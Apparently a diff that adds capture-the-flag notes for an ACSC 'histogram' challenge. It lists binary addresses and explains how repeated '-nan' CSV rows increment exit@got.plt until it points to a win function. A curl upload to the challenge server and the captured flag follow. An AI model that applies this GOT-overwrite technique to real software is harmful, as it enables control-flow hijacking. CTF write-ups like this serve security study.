@@ -1,0 +1,25 @@
+map: 0x4040a0
+exit@got.plt: 0x404050
+	original value: 0x4010a0
+win: 0x401268
+
+every "-nan, 101.0" can add 1 to the value at 0x404050
+0x401268 - 0x4010a0 = 456
+Use "inf, inf" to go to fatal and exit
+
+
+curl -k -X POST "https://histogram.chal.acsc.asia/api/histogram" -F "csv=@payload.csv"
+```
+...
+ACSC{NaN_demo_iiyo}
+ACSC{NaN_demo_iiyo}
+ACSC{NaN_demo_iiyo}
+ACSC{NaN_demo_iiyo}
+ACSC{NaN_demo_iiyo}
+ACSC{NaN_demo_iiyo}
+ACSC{NaN_demo_iiyo}
+...
+```
+
+========= Official Script =========
+python3 exp.py
